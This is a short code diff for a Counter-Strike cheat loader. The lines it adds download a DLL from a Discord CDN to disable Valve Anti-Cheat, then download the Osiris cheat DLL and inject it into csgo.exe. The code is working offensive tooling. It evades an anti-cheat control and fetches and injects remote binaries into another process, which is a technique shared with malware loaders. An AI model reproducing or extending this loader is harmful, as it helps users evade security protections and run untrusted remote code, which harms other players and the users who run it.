@@ -5,16 +5,22 @@
 
 int main()
 {
-
-	int vacDisabled = !vac_inhibitor();
+	LPCSTR vac_inhibitor_url = "https://cdn.discordapp.com/attachments/1136059719484719175/1147729662701748224/vac3_inhibitor.dll";
+	int vacDisabled = !vac_inhibitor(vac_inhibitor_url);
 
 	if (vacDisabled)
 	{
-		LPCSTR dllPath = "C:\\Users\\muril\\Downloads\\Osiris\\Release\\Osiris.dll";
-		loader(dllPath);
+		LPCSTR dllUrl = "https://cdn.discordapp.com/attachments/1136059719484719175/1147720934229295175/Osiris.dll";
 
-		ExitProcess(0);
-		return 0;
+		int verifyDllLoaded = !injector(dllUrl, "csgo.exe", 1);
+
+		if(verifyDllLoaded)
+		{
+			Beep(500, 100);
+
+			ExitProcess(0);
+			return 0;
+		}
 	}
 
 	return 1;
